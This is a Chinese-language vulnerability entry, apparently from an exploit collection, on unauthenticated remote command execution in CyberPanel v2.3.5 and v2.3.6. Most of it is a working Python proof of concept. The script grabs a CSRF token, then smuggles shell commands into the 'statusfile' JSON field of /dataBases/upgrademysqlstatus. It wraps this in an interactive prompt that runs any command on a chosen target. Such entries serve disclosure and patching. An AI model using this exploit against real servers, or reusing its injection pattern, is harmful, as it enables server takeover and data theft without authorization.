# cyberpanel-v236-pre-auth-rce

>   CyberPanel是一个开源的Web控制面板，它提供了一个用户友好的界面，用于管理网站、电子邮件、数据库、FTP账户等。

## 来源

[https://dreyand.rs/code/review/2024/10/27/what-are-my-options-cyberpanel-v236-pre-auth-rce](https://dreyand.rs/code/review/2024/10/27/what-are-my-options-cyberpanel-v236-pre-auth-rce)

## 漏洞类型

远程命令执行

## 简介

CyberPanel的/dataBases/upgrademysqlstatus接口存在远程命令执行漏洞，由于该接口未做身份验证和参数过滤，未授权的攻击者可以通过此接口执行任意命令获取服务器权限，从而造成数据泄露、服务器被接管等严重的后果。

## 影响范围

-   CyberPanel v2.3.5
-   CyberPanel v2.3.6

## POC

```python
import httpx 
import sys 

def get_CSRF_token(client):
    resp = client.get("/")
    
    return resp.cookies['csrftoken']
    
def pwn(client, CSRF_token, cmd):
    headers = {
        "X-CSRFToken": CSRF_token,
        "Content-Type":"application/json",
        "Referer": str(client.base_url)
    }
    
    payload = '{"statusfile":"/dev/null; %s; #","csrftoken":"%s"}' % (cmd, CSRF_token)
    
    return client.put("/dataBases/upgrademysqlstatus", headers=headers, data=payload).json()["requestStatus"]
    
def exploit(client, cmd):
    CSRF_token = get_CSRF_token(client)
    stdout = pwn(client, CSRF_token, cmd)
    print(stdout)
    
if __name__ == "__main__":
    target = sys.argv[1]
    
    client = httpx.Client(base_url=target, verify=False)
    while True:
        cmd = input("$> ")

        exploit(client, cmd)
```




